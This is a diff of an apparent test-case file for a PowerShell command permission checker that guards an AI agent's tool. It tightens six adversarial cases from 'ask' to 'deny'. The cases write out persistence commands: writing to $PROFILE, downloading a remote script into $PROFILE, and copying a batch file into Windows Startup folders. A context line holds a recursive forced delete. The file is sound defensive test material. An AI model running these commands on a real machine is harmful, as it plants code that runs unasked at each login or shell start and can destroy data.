@@ -22,9 +22,9 @@
 - {id: psrev-env-unknown-var, tool: PowerShell, platform: windows, input: {command: 'Remove-Item -Recurse -Force $env:NOSUCHVAR\x'}, expect: deny, adv: true}
 
 # ---- $PROFILE and startup folders ------------------------------------------------------------------
-- {id: psrev-profile-add-content, tool: PowerShell, platform: windows, input: {command: 'Add-Content $PROFILE "x"'}, expect: ask, adv: true}
-- {id: psrev-profile-lower, tool: PowerShell, platform: windows, input: {command: 'Add-Content $profile "x"'}, expect: ask, adv: true}
-- {id: psrev-profile-quoted, tool: PowerShell, platform: windows, input: {command: 'Set-Content "$PROFILE" "x"'}, expect: ask, adv: true}
-- {id: psrev-profile-outfile, tool: PowerShell, platform: windows, input: {command: 'Invoke-WebRequest https://example.com/p.ps1 -OutFile $PROFILE'}, expect: ask, adv: true}
-- {id: psrev-programdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"'}, expect: ask, adv: true}
-- {id: psrev-appdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"'}, expect: ask, adv: true}
+- {id: psrev-profile-add-content, tool: PowerShell, platform: windows, input: {command: 'Add-Content $PROFILE "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
+- {id: psrev-profile-lower, tool: PowerShell, platform: windows, input: {command: 'Add-Content $profile "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
+- {id: psrev-profile-quoted, tool: PowerShell, platform: windows, input: {command: 'Set-Content "$PROFILE" "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
+- {id: psrev-profile-outfile, tool: PowerShell, platform: windows, input: {command: 'Invoke-WebRequest https://example.com/p.ps1 -OutFile $PROFILE'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
+- {id: psrev-programdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
+- {id: psrev-appdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
